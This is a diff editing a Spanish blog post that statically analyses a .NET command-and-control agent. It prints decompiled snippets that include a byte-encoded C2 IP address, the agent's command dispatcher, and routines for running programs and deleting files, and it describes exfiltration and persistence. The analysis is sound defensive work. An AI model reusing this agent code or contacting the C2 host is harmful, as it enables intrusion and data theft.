@@ -1,18 +1,19 @@
 +++
 title = '004 - Analizando un agente de C2 - Parte 2: el agente'
-date = 2023-12-18T12:03:49-05:00
-draft = true
+date = 2023-12-22T12:03:49-05:00
+draft = false
 translationKey = '004-dotnet-agent'
-description = 'In this first part, we will analyze a malicious macro containing an embedded C2 agent. We will analyze how it acts, what techniques it uses to hinder analysis, and how we can obtain indicators of compromise from it.'
-cover = "/img/003-procExp.png"
+description = 'En este artículo, continuación directa del artículo anterior, analizamos un agente de C2 desarrollado en .NET para identificar cómo evade defensas, las capacidades que ofrece, y cómo podemos obtener indicadores de compromiso de este.'
 +++
 
 
 ## 1. Introducción
 
-Este post es la continuación de otro donde analizamos una macro maliciosa, que tenía embebido un agente de C2; si aún no lees ese post puedes [hacerlo aquí](/es/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/)).
+Este artículo es la continuación de otro donde analizamos una macro maliciosa, la cual tenía embebido un agente de C2; si aún no lees ese post puedes [hacerlo aquí](/es/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/).
 
-En el primer post identificamos que, luego de realizar ciertas técnicas para dificultar su detección, la macro maliciosa extraía y ejecutaba un archivo .exe que estaba embebido como parte del documento malicioso. En este post, analizaremos dicho archivo de manera estática y dinámica para comprender cómo funciona, cómo identificamos que corresponde a un agende de C2, y qué indicadores de compromiso podemos obtener.
+En el primer artículo identificamos que, luego de ejecutar ciertas técnicas para dificultar su detección, la macro maliciosa extraía y ejecutaba un binario .exe que estaba embebido como parte del documento malicioso. En este artículo, analizaremos dicho binario de manera estática para comprender cómo funciona, cómo identificamos que corresponde a un agente de C2, y qué indicadores de compromiso podemos obtener de este.
+
+Debido a la longitud del artículo, en una tercera parte se evaluará de manera dinámica el binario.
 
 > **Disclaimer**: Ejecutar malware en un dispositivo personal/corporativo puede poner en riesgo tu información/la información de tu empresa. Nunca ejecutes malware en un dispositivo que no ha sido específicamente configurado para el análisis.
 
@@ -35,23 +36,22 @@ Al abrir el binario en PEStudio, podemos identificar algunas cosas interesantes:
 
 1. PEStudio identifica el binario como de tipo "Microsoft .NET"
 2. El binario parece haber sido compilado el 05 de Setiembre del 2023, por lo que es reciente. (Dicho valor puede ser alterado por lo que no es 100% confiable)
-3. Se identifica la ruta del archivo "debug" del binario, la cual contiene \obj\debug, directorio estándar creado por Visual Studio.
+3. Se identifica la ruta del archivo "debug" del binario, la cual contiene \obj\Debug, directorio estándar creado por Visual Studio.
 
-Dichos indicadores parecen indicarnos que se trata de un programa .NET; adicionalmente, analizando algunas de las otras secciones de información que ofrece PEStudio podemos obtener mayor información:
+Dichos factores parecen indicarnos que se trata de un programa .NET; adicionalmente, analizando algunas de las otras secciones de información que ofrece PEStudio podemos obtener mayor confirmación sobre esto:
 
 ![alt text](/img/004-pestudio2.png "PEStudio Indicators")
 
 ![alt text](/img/004-pestudio3.png "PEStudio Imports")
 
-1. PEStudio identifica el namespace .NET System.Net.Socket, un indicador más de que es un programa .NET
-2. PEStudio identifica una IP, que puede ser un indicador de compromiso (IOC) de interés.
-3. PEStudio identifica que el programa, durante su ejecución, importa [clases de .NET](https://learn.microsoft.com/en-us/dotnet/api/?view=net-8.0)
+1. PEStudio identifica el namespace .NET System.Net.Socket.
+2. PEStudio identifica que el programa, durante su ejecución, importa [clases de .NET](https://learn.microsoft.com/en-us/dotnet/api/?view=net-8.0)
 
-Con dicha información, podemos decir con casi total certeza de que el binario corresponde a uno desarrollado con el framework .NET.
+Con dicha información, podemos decir con casi total certeza de que el binario corresponde a uno desarrollado con el framework .NET. Adicionalmente, verificamos que PEStudio identifica una IP, que puede ser un indicador de compromiso (IOC) de interés.
 
-Los archivos desarrollados en .NET son usualmente suceptibles a ser decompilados, debido a que no se compilan directo a lenguaje máquina (los 0 y 1 que entiende la computadora), sino que se compilan en un lenguaje intermedio (llamado Intermediate Language - IL), el cual se compila _durante ejecución_ a lenguaje máquina específico al entorno donde se está ejecutando.
+Los archivos desarrollados en .NET son usualmente suceptibles a ser decompilados, debido a que no se compilan directo a lenguaje máquina (los 0 y 1 que entiende la computadora), sino que se compilan a un lenguaje intermedio (llamado Intermediate Language - IL), el cual se compila _durante la ejecución del programa_ a lenguaje máquina específico al entorno donde se está ejecutando.
 
-Si bien dicho framework provee flexibilidad, el lenguaje intermedio contiene información sobre los nombres de las clases, métodos, metadata, etc. del programa original, lo que permite ser decompilado y "revertido" casi a código fuente.
+Si bien dicho framework provee flexibilidad, el lenguaje intermedio contiene información sobre los nombres de las clases, métodos, metadata, etc. del programa original, lo que permite que sea decompilado y así, "revertido" casi a código fuente.
 
 Existen distintas herramientas que permiten decompilar un archivo creado en .NET, entre las que se encuentran [_ILSpy_](https://github.com/icsharpcode/ILSpy) y [_dnSpy_](https://github.com/dnSpy/dnSpy); para el presente análisis utilizaré _dnSpy_ debido a las capacidades de debugging que ofrece.
 
@@ -63,8 +63,9 @@ Al abrir el ejecutable en _dnSpy_, validamos que efectivamente podemos visualiza
 
 Dado que analizar cada función que llama el ejecutable puede ser muy tedioso, seguiremos el flujo de llamadas que se hacen desde el método Main.
 
-1. Cuando el programa se inicia llama al formulario Form1, el cual, al iniciarse llama al método **InitializeComponent()**
-2. El método InitializeComponent() se crea automáticamente al momento de crear un formulario; de este método podemos destacar dos cosas: se configura la opacidad del formulario a 0 para hacer de este invisible, y se llama al método **Form1_Load**:
+Verificamos que cuando el programa se inicia llama al formulario Form1, el cual, al inicializarse, invoca al método **InitializeComponent()**. De la configuración de dicho método podemos destacar dos cosas:
+1. Se configura la opacidad del formulario a 0 para hacer de este invisible.
+2. Se llama al método **Form1_Load**.
 
 ```c#
 private void InitializeComponent()
@@ -102,10 +103,10 @@ private void Form1_Load(object sender, EventArgs e)
 		}
 ```
 4. El método **corediQart()** realiza las siguientes acciones:
-    4.1 Asigna el primer puerto definido en la variable _ports_ a la variable _port_
-    4.2 Obtiene el nombre de la computadora donde se está ejecutando, así como el usuario que está ejecutando el programa y lo asigna a la variable _userAiunt_
-    4.3 Crea un objeto de tipo _TimerCallback_ que llama al método **procvQloop**
-    4.4 Configura el objeto de tipo _TimerCallback_ para que se ejecute cada 58.51 segundos, luego de esperar inicialmente 49.12 segundos.
+    1. Asigna el primer puerto definido en la variable _ports_ a la variable _port_.
+    2. Obtiene el nombre de la computadora donde se está ejecutando, así como el usuario que está ejecutando el programa y lo asigna a la variable _userAiunt_.
+    3. Crea un objeto de tipo _TimerCallback_ que llama al método **procvQloop**.
+    4. Configura el objeto de tipo _TimerCallback_ para que se ejecute cada 58.51 segundos, luego de esperar inicialmente 49.12 segundos.
 
 ```c#
 		public void corediQart()
@@ -136,17 +137,43 @@ private void Form1_Load(object sender, EventArgs e)
 
 ```
 
-5. Analizando lo que hace el método **procvQloop**, inicia una conexión TCP con la IP almacenada en la variable _min\_codns_; en dicha variable, la IP se encuentra almacenada como un conjunto de bytes, probablemente para dificultar su detección:
+5. Analizando lo que hace el método **procvQloop()**, inicia una conexión TCP con la IP almacenada en la variable _min\_codns_; en dicha variable, la IP se encuentra almacenada como un conjunto de bytes, probablemente para dificultar su detección:
 
-![alt text](/img/004-ipbytes.png "IP as bytes")
+```c#
+DIRERRIF.mainwtp = Encoding.UTF8.GetString(DIRERRIF.min_codns, 0, DIRERRIF.min_codns.Length).ToString();
+this.maiedet = new TcpClient();
+this.maiedet.Connect(DIRERRIF.mainwtp, DIRERRIF.port);
+
+public static byte[] min_codns = new byte[]
+{49, 54, 50, 46, 50, 52, 53, 46, 49, 57, 49, 46, 50, 49, 55};
+```
 
 La conexión TCP se realiza con la IP almacenada en la variable _min\_codns_ en el puerto asignado a la variable _port_.
 
 6. Una vez realizada la conexión, si es exitosa, se llama al método **procD_core()**, el cual realiza múltiples operaciones:
-    6.1 Obtiene una respuesta de la conexión TCP establecida previamente
-    6.2 Como parte de la respuesta espera que el tamaño de la comunicación se especifique en los primeros 5 bytes del stream de datos, el cual utiliza para obtener el resto de la data de la conexión en bloques de 1024 bytes
-    6.3 Separa la respuesta obtenida utilizando el separador '='
-    6.4 En base al primer valor de la respuesta (lo que estaba antes del '=') llama a distintos métodos.
+    1. Obtiene una respuesta de la conexión TCP establecida previamente.
+    2. Separa la respuesta obtenida utilizando el separador '='.
+    3. En base al primer valor de la respuesta (lo que estaba antes del '=') llama a distintos métodos.
+
+
+```c#
+private void procD_core()
+        ...
+		string[] procss_type = this.get_procsQtype();
+		...
+		string text = procss_type[0].ToLower();
+		...
+		if (text == "thyTumb")
+		{
+			this.imagiQtails(procss_type[1]);
+		}
+		if (text == "scyTrsz")
+		{
+			this.dsAscrnsize(procss_type[1]);
+		}
+		...
+```
+
 
 ```c#
 public string[] get_procsQtype()
@@ -182,24 +209,6 @@ public string[] get_procsQtype()
 }
 ```
 
-```c#
-private void procD_core()
-        ...
-		string[] procss_type = this.get_procsQtype();
-		...
-		string text = procss_type[0].ToLower();
-		...
-		if (text == "thyTumb")
-		{
-			this.imagiQtails(procss_type[1]);
-		}
-		if (text == "scyTrsz")
-		{
-			this.dsAscrnsize(procss_type[1]);
-		}
-		...
-```
-
 
 Sin analizar el resto de las funciones, el comportamiento del programa ya nos hace suponer que puede ser un agente de C2:
 
@@ -212,6 +221,7 @@ En base a dicho análisis podemos asumir que el servidor envía comandos al agen
 ### 2.3 Análisis de los métodos del agente de C2
 
 Debido a que analizar cada función sería muy tedioso, analizaremos algunas funciones que me parecieron interesantes:
+
 
 #### 2.3.1 Listar procesos
 
@@ -226,6 +236,7 @@ Al recibir el comando "geyTtavs", se obtienen los procesos que se están ejecuta
 La función **loadQData** envía el tipo de respuesta a esperar, el tamaño de esta y la respuesta al servidor.
 
 Con solo analizar dicha función, podemos confirmar que es un agente de Comando y Control: el programa se contacta a un servidor, recibe una instrucción (listar procesos en este caso) y la envía de vuelta al servidor.
+
 
 #### 2.3.2 Establecer persistencia
 
@@ -250,9 +261,10 @@ Al recibir el comando "flyTes" junto con una ruta, el comando lista los archivos
 
 ![alt text](/img/004-listfiles2.png "Read directory")
 
-#### 2.3.4 Sacar captura de pantalla
 
-Los comandos "cdyTcrgn", "csyTcrgn" y "csyTdcrgn" pueden ser utilizados para sacar capturas de pantalla cuyo alto es enviado como parámetro:
+#### 2.3.4 Sacar capturas de pantalla
+
+Los comandos "cdyTcrgn", "csyTcrgn" y "csyTdcrgn" pueden ser utilizados para sacar capturas de pantalla:
 
 ![alt text](/img/004-sc1.png "Screen capture 1")
 
@@ -260,15 +272,19 @@ Los comandos "cdyTcrgn", "csyTcrgn" y "csyTdcrgn" pueden ser utilizados para sac
 
 ![alt text](/img/004-sc3.png "Screen capture 3")
 
-#### 2.3.5 Exfiltración de un archivo
 
-El comando "afyTile" puede ser utilizado para cargar un archivo de la máquina victima al servidor; para ello, recibe como parámetro la ruta del archivo y envía la ruta del archivo, el nombre del archivo y el contenido de este:
+#### 2.3.5 Exfiltración de archivos
+
+El comando "afyTile" puede ser utilizado para exfiltrar un archivo de la máquina víctima al servidor; para ello, recibe como parámetro la ruta del archivo a exfiltrar:
 
 ![alt text](/img/004-exfilb.png "File exfiltration")
 
 ![alt text](/img/004-exfila.png "File exfiltration 2")
 
-#### 2.3.6 Ejecutar un binario
+La información devuelta al servidor incluye la ruta del archivo, el nombre del archivo y el contenido de este.
+
+
+#### 2.3.6 Ejecutar binarios
 
 Para ejecutar un programa que exista en el sistema (sea nativo o descargado con otro comando), se puede utilizar el comando "ruyTnf", el cual inicia un nuevo proceso recibiendo como parámetro el nombre del programa a ejecutar. En caso el programa reciba parámetros, se envían utilizando el caracter '>' como separador.
 
@@ -280,6 +296,7 @@ if (text == "ruyTnf") {
   }
 }
 ```
+
 
 #### 2.3.7 Eliminar un archivo
 
@@ -297,6 +314,7 @@ public void trasQfiles(string path) {
   }
 }
 ```
+
 
 ## 3. Conclusiones
 
